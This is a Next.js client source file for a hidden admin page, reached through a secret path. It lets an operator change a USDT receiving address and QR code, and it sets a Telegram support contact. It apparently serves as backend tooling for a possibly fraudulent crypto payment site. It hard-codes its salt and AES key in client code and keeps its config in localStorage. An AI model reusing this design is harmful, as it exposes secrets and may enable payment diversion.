'use client';

import { useState } from 'react';
import { useRouter, useParams } from 'next/navigation';
import CryptoJS from 'crypto-js';
import { verifyAdminPath } from '../../config/crypto';

// 使用多重加密和混淆
const HASH_SALT = '9c4e2f8a1d7b';
const TIME_WINDOW = 300000; // 5分钟
const verifyPassword = (input: string) => {
  const now = Date.now();
  const timeKey = Math.floor(now / TIME_WINDOW);
  
  // 生成三个时间窗口的有效哈希
  for (let i = -1; i <= 1; i++) {
    const timestamp = timeKey + i;
    const combined = `${input}${HASH_SALT}${timestamp}`;
    const hash = CryptoJS.SHA256(combined).toString();
    const doubleHash = CryptoJS.SHA256(hash + HASH_SALT).toString();
    
    // 验证哈希
    if (doubleHash === localStorage.getItem('auth_hash')) {
      return true;
    }
  }
  return false;
};

export default function SecurePage() {
  const [password, setPassword] = useState('');
  const [newAddress, setNewAddress] = useState('');
  const [error, setError] = useState('');
  const [qrcode, setQrcode] = useState<File | null>(null);
  const [uploading, setUploading] = useState(false);
  const router = useRouter();
  const params = useParams();
  
  // 验证访问路径
  if (!params?.path?.[0] || !verifyAdminPath(params.path[0])) {
    router.push('/404');
    return null;
  }

  const handleQrcodeChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    if (e.target.files && e.target.files[0]) {
      setQrcode(e.target.files[0]);
    }
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setUploading(true);
    
    try {
      // 验证密码
      const timestamp = Date.now();
      const response = await fetch('/api/auth', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          password: password.trim(),
          timestamp
        }),
      });

      const data = await response.json();
      
      if (!data.success) {
        setError('密码错误');
        setUploading(false);
        return;
      }

      if (!newAddress.trim()) {
        setError('请输入新地址');
        setUploading(false);
        return;
      }

      // 上传二维码（如果有）
      if (qrcode) {
        const formData = new FormData();
        formData.append('file', qrcode);
        
        const qrcodeResponse = await fetch('/api/qrcode', {
          method: 'POST',
          body: formData
        });
        
        if (!qrcodeResponse.ok) {
          throw new Error('二维码上传失败');
        }
      }

      // 更新配置
      const config = {
        address: newAddress.trim(),
        customerService: {
          url: 'https://t.me/Juyy2',
          id: '@juyy2'
        }
      };
      
      const encrypted = CryptoJS.AES.encrypt(
        JSON.stringify(config),
        '8a1f876c2e4d'
      ).toString();
      
      localStorage.setItem('encrypted_config', encrypted);
      localStorage.setItem('auth_token', data.token);
      
      // 强制触发配置更新
      window.dispatchEvent(new Event('storage'));
      
      alert('更新成功');
      router.push('/usdt');
    } catch (err) {
      setError('更新失败，请重试');
    } finally {
      setUploading(false);
    }
  };

  return (
    <div className="min-h-screen bg-gray-100 flex items-center justify-center py-12 px-4 sm:px-6 lg:px-8">
      <div className="max-w-md w-full space-y-8">
        <form className="mt-8 space-y-6" onSubmit={handleSubmit}>
          <div className="rounded-md shadow-sm -space-y-px">
            <div>
              <input
                type="password"
                required
                className="appearance-none rounded-none relative block w-full px-3 py-2 border border-gray-300 placeholder-gray-500 text-gray-900 rounded-t-md focus:outline-none focus:ring-blue-500 focus:border-blue-500 focus:z-10 sm:text-sm"
                placeholder="验证码"
                value={password}
                onChange={(e) => setPassword(e.target.value)}
              />
            </div>
            <div>
              <input
                type="text"
                required
                className="appearance-none rounded-none relative block w-full px-3 py-2 border border-gray-300 placeholder-gray-500 text-gray-900 focus:outline-none focus:ring-blue-500 focus:border-blue-500 focus:z-10 sm:text-sm"
                placeholder="新地址"
                value={newAddress}
                onChange={(e) => setNewAddress(e.target.value)}
              />
            </div>
            <div>
              <input
                type="file"
                accept="image/png,image/jpeg"
                className="appearance-none rounded-none relative block w-full px-3 py-2 border border-gray-300 placeholder-gray-500 text-gray-900 rounded-b-md focus:outline-none focus:ring-blue-500 focus:border-blue-500 focus:z-10 sm:text-sm"
                onChange={handleQrcodeChange}
              />
            </div>
          </div>

          {error && (
            <div className="text-red-500 text-sm text-center">
              {error}
            </div>
          )}

          <div>
            <button
              type="submit"
              disabled={uploading}
              className="group relative w-full flex justify-center py-2 px-4 border border-transparent text-sm font-medium rounded-md text-white bg-blue-600 hover:bg-blue-700 focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-blue-500 disabled:bg-gray-400"
            >
              {uploading ? '更新中...' : '确认'}
            </button>
          </div>
        </form>
      </div>
    </div>
  );
} 